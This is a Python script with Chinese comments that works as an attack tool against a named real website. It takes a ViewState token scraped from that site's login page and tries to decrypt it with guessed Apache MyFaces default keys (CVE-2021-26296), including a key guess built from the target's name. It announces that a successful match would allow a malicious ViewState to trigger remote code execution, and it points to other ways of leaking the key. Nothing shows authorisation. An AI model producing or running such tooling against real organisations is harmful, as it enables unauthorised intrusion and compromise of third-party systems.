"""
Apache MyFaces CVE-2021-26296 - ViewState DES 解密验证
目标: www.cargosmart.com
目的: 验证 jsf_tree_64 是否使用已知默认密钥加密（不发送任何请求）
"""
import base64
import struct
import sys

# 尝试 pycryptodome，回退到 pyDes
try:
    from Crypto.Cipher import DES, DES3, AES
    CRYPTO_LIB = "pycryptodome"
except ImportError:
    try:
        import pyDes
        CRYPTO_LIB = "pyDes"
    except ImportError:
        CRYPTO_LIB = None

# 从登录页面抓取的真实 ViewState
JSF_TREE_64 = "1HdYiTH+P6ZCQ/RAGG4gAylPyNIouJijCwZaRsck9lQNaxaypp3fCiwPT5EhCHG/ucTi5E5s+5BH+VDghCRwqRo/y7a1iQz26chpNxvMo6soDOj03uZR+cIk3f9u/gNkE4/RcK6/7mkBP9zBtdBPE1Lx6jJqAB+Rmm1r/dHciglAgdS5roz7P+hKVa77IqxzDxlrLFUDMfq0NWD342/+0P19pzS6+jvcGiQ83UqgmlE0kIK0yssV1q7fOy1+9Ln6LxPdxZUOMcZES/5Adha+zOqGn5xsr6ggeJNJTdSZkcc7TAA7uSBlQ4uCYNZNg4S22IsE2Kd2woEGUOnEA/iSMy4r7B2qQhmEOfxuEMIRRCF7ZH4LDELHTLxA9hQCcbu2RCN7gc4lHh15IDuzjeUVCyI8pzsUXTeXFN1Ty8yx9C4kh80qyUpld81wDRm1+802d+oK5s++yjPRWJNNgOsPS/5yYZs9H64Wcel0ogj0qBprkZn0YaKw+CL79PdfPrNEKOhtJgLt+HNFlcMvDqa/ug5tHWpaJRH79CkiTID6IMISL7xFO/pMcD/qeSBw34q58tlMaNPz844eB882lrbPPhnNK7Czi5ZNZJ44zXx5+oBjwsVdzrnqVQ=="

# MyFaces 已知默认密钥（base64 原文 → 取字节作 DES 密钥）
# 参考: CVE-2021-26296 PoC / MyFaces 源码
KNOWN_SECRETS = [
    "NXkJmdhQ",          # 最常见默认值
    "MYFACESmyfaces",    # 社区报告值
    "TriDES-myfaces",    # 3DES 候选
    "myfaces-secret",    # 变体
    "secret",
    "changeit",
    "password",
    "12345678",          # 8字节满足DES
    "cargosmt",          # 目标名变体
    "WebLogic",
]

JAVA_SERIAL_MAGIC = b'\xac\xed\x00\x05'  # Java 序列化魔术字节
ZLIB_MAGIC = b'\x78\x9c'                  # zlib 压缩头
GZIP_MAGIC = b'\x1f\x8b'                  # gzip 头

def check_plaintext(data: bytes, secret_label: str) -> bool:
    """检查解密结果是否为有效 Java 序列化数据"""
    if data[:4] == JAVA_SERIAL_MAGIC:
        print(f"[!!!] JAVA SERIALIZATION CONFIRMED! Secret: '{secret_label}'")
        print(f"      解密后前32字节: {data[:32].hex()}")
        return True
    if data[:2] in (ZLIB_MAGIC, GZIP_MAGIC):
        print(f"[!] 压缩数据 (可能是序列化后压缩). Secret: '{secret_label}'")
        print(f"    前16字节: {data[:16].hex()}")
        return True
    # 部分 MyFaces 版本先压缩再加密——检查解密后能否解压
    try:
        import zlib
        decompressed = zlib.decompress(data)
        if decompressed[:4] == JAVA_SERIAL_MAGIC:
            print(f"[!!!] ZLIB+JAVA SERIAL CONFIRMED! Secret: '{secret_label}'")
            print(f"      解压后前32字节: {decompressed[:32].hex()}")
            return True
    except Exception:
        pass
    return False

def try_des_ecb(ciphertext: bytes, key_bytes: bytes, label: str) -> bool:
    """DES-ECB 解密尝试"""
    if len(key_bytes) < 8:
        return False
    key = key_bytes[:8]
    try:
        if CRYPTO_LIB == "pycryptodome":
            cipher = DES.new(key, DES.MODE_ECB)
            plain = cipher.decrypt(ciphertext)
            return check_plaintext(plain, f"{label} [DES-ECB]")
        elif CRYPTO_LIB == "pyDes":
            cipher = pyDes.des(key, pyDes.ECB)
            plain = cipher.decrypt(ciphertext)
            return check_plaintext(plain, f"{label} [DES-ECB]")
    except Exception as e:
        pass
    return False

def try_des_cbc(ciphertext: bytes, key_bytes: bytes, label: str) -> bool:
    """DES-CBC 解密（IV 从密文前8字节提取）"""
    if len(key_bytes) < 8 or len(ciphertext) < 16:
        return False
    key = key_bytes[:8]
    iv = ciphertext[:8]
    body = ciphertext[8:]
    try:
        if CRYPTO_LIB == "pycryptodome":
            cipher = DES.new(key, DES.MODE_CBC, iv)
            plain = cipher.decrypt(body)
            return check_plaintext(plain, f"{label} [DES-CBC iv=first8]")
    except Exception:
        pass
    return False

def try_3des_ecb(ciphertext: bytes, key_bytes: bytes, label: str) -> bool:
    """3DES-ECB（24字节密钥）"""
    if len(key_bytes) < 8:
        return False
    # 填充到16或24字节
    if len(key_bytes) < 16:
        key = (key_bytes * 3)[:24]
    elif len(key_bytes) < 24:
        key = (key_bytes * 2)[:24]
    else:
        key = key_bytes[:24]
    try:
        if CRYPTO_LIB == "pycryptodome":
            cipher = DES3.new(key, DES3.MODE_ECB)
            plain = cipher.decrypt(ciphertext)
            return check_plaintext(plain, f"{label} [3DES-ECB]")
    except Exception:
        pass
    return False

def main():
    print(f"[*] Crypto 库: {CRYPTO_LIB}")
    if not CRYPTO_LIB:
        print("[-] 未找到加密库，尝试: pip install pycryptodome")
        sys.exit(1)

    ciphertext = base64.b64decode(JSF_TREE_64)
    print(f"[*] 密文长度: {len(ciphertext)} 字节")
    print(f"[*] 密文前16字节: {ciphertext[:16].hex()}")
    print(f"[*] 开始尝试 {len(KNOWN_SECRETS)} 个已知密钥...\n")

    found = False
    for secret in KNOWN_SECRETS:
        # 直接使用 ASCII 字节作密钥
        key_bytes = secret.encode('utf-8')
        label = repr(secret)

        if try_des_ecb(ciphertext, key_bytes, label):
            found = True
        if try_des_cbc(ciphertext, key_bytes, label):
            found = True
        if try_3des_ecb(ciphertext, key_bytes, label):
            found = True

        # 也尝试 base64 解码后的字节作密钥
        try:
            decoded_key = base64.b64decode(secret + '==')
            if len(decoded_key) >= 8:
                b64_label = f"{label}[b64decoded]"
                if try_des_ecb(ciphertext, decoded_key, b64_label):
                    found = True
                if try_des_cbc(ciphertext, decoded_key, b64_label):
                    found = True
        except Exception:
            pass

    if not found:
        print("\n[-] 未找到匹配的默认密钥")
        print("[*] ViewState 可能使用了自定义密钥或随机生成密钥")
        print("[*] 需通过其他途径获取密钥（如 actuator/configprops、web.xml 泄露等）")
        # 打印密文信息供进一步分析
        print(f"\n[信息] 密文块数: {len(ciphertext)//8} (每块8字节)")
        print(f"[信息] 密文是否为8的倍数: {len(ciphertext) % 8 == 0}")
    else:
        print("\n[!!!] 发现弱密钥! 可以构造恶意 ViewState 触发反序列化 RCE!")

if __name__ == "__main__":
    main()
